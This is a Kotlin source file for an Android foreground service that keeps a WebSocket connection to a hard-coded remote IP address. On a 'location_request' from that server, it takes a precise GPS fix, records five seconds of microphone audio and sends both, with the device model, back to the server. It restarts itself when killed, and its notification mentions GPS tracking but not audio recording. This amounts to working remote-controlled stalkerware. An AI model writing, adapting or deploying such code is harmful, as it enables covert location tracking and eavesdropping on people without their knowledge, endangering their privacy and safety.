package dev.abrorjon755.gpslocation.service

import android.Manifest
import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Location
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Base64
import android.util.Log
import androidx.annotation.RequiresApi
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.*
import dev.abrorjon755.gpslocation.R
import kotlinx.coroutines.*
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import org.json.JSONObject
import java.io.File
import java.io.FileInputStream
import java.time.LocalTime
import java.util.concurrent.TimeUnit

@Suppress("DEPRECATION")
class GpsLocationService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var locationCallback: LocationCallback
    private lateinit var webSocket: WebSocket
    private var webSocketClient: OkHttpClient? = null
    private var isWebSocketConnected = false
    private var isServiceRunning = false

    override fun onCreate() {
        super.onCreate()
        Log.d("SERVICE", "GpsLocationService onCreate")
        isServiceRunning = true
        startForeground(1, createNotification())

        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        setupWebSocket()
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d("SERVICE", "GpsLocationService onDestroy")
        isServiceRunning = false
        serviceScope.cancel()
        webSocket.cancel()
        webSocketClient?.dispatcher?.executorService?.shutdown()

        // Restart service if killed
        val intent = Intent(this, GpsLocationService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d("SERVICE", "GpsLocationService onStartCommand")
        return START_REDELIVER_INTENT
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun setupWebSocket() {
        Log.d("SERVICE", "Setting up WebSocket")
        webSocketClient = OkHttpClient.Builder()
            .pingInterval(30, TimeUnit.SECONDS)
            .build()

        val request = Request.Builder().url("ws://35.184.28.154:8080/ws").build()

        webSocket = webSocketClient!!.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.d("WebSocket", "Connected")
                isWebSocketConnected = true
            }

            @RequiresApi(Build.VERSION_CODES.O)
            override fun onMessage(webSocket: WebSocket, text: String) {
                Log.d("WebSocket", "Received: $text")
                if (text.contains("location_request")) {
                    serviceScope.launch {
                        getCurrentLocationAndSend()
                    }
                }
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e("WebSocket", "Failure: ${t.message}")
                isWebSocketConnected = false
                reconnectWebSocket()
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                Log.d("WebSocket", "Closed: $reason")
                isWebSocketConnected = false
                reconnectWebSocket()
            }
        })
    }

    private fun reconnectWebSocket() {
        serviceScope.launch {
            delay(5000)
            if (isServiceRunning) {
                Log.d("WebSocket", "Attempting to reconnect...")
                setupWebSocket()
            }
        }
    }

    @SuppressLint("MissingPermission")
    @RequiresApi(Build.VERSION_CODES.O)
    private fun getCurrentLocationAndSend() {
        if (!hasLocationPermission() || !hasAudioPermission()) {
            Log.e("SERVICE", "Missing required permissions")
            return
        }

        locationCallback = object : LocationCallback() {
            override fun onLocationResult(locationResult: LocationResult) {
                super.onLocationResult(locationResult)
                if (locationResult.locations.isNotEmpty()) {
                    val location = locationResult.locations[0]
                    Log.d("SERVICE", "Location: $location")
                    serviceScope.launch {
                        sendLocation(location)
                    }
                    // ✅ Stop location updates after first response
                    fusedLocationClient.removeLocationUpdates(this)
                }
            }
        }

        fusedLocationClient.requestLocationUpdates(
            LocationRequest.create().apply {
                interval = 10000
                fastestInterval = 5000
                priority = LocationRequest.PRIORITY_HIGH_ACCURACY
            },
            locationCallback,
            Looper.getMainLooper()
        )
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun sendLocation(location: Location) {
        val outputFile = File(externalCacheDir, "recording_${System.currentTimeMillis()}.m4a")
        val recorder = MediaRecorder()
        try {
            recorder.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setOutputFile(outputFile.absolutePath)
                prepare()
                start()
            }

            // Delay for 5 seconds to record audio
            Handler(Looper.getMainLooper()).postDelayed({
                try {
                    recorder.stop()
                    recorder.release()

                    val bytes = FileInputStream(outputFile).use { it.readBytes() }
                    val base64Audio = Base64.encodeToString(bytes, Base64.NO_WRAP)

                    val json = JSONObject().apply {
                        put("type", "audio")
                        put("data", base64Audio)
                    }

                    val message = JSONObject().apply {
                        put("type", "location_response")
                        put("device", Build.MODEL)
                        put("latitude", location.latitude)
                        put("longitude", location.longitude)
                        put("time", LocalTime.now().toString())
                        put("audio", json)
                    }

                    Log.d("SERVICE", "Sending via WebSocket: $message")
                    webSocket.send(message.toString())

                } catch (e: Exception) {
                    Log.e("SERVICE", "Error stopping recorder: ${e.message}")
                }
            }, 5000)
        } catch (e: Exception) {
            Log.e("SERVICE", "Recorder error: ${e.message}")
            recorder.release()
        }
    }

    private fun hasLocationPermission(): Boolean {
        return ActivityCompat.checkSelfPermission(
            this,
            Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(
                    this,
                    Manifest.permission.ACCESS_COARSE_LOCATION
                ) == PackageManager.PERMISSION_GRANTED
    }

    private fun hasAudioPermission(): Boolean {
        return ActivityCompat.checkSelfPermission(
            this,
            Manifest.permission.RECORD_AUDIO
        ) == PackageManager.PERMISSION_GRANTED
    }

    private fun createNotification(): Notification {
        val channelId = "gps_service_channel"
        val channelName = "GPS Service"

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                channelName,
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("GPS Tracking Service")
            .setContentText("Waiting for WebSocket location requests...")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
    }
}
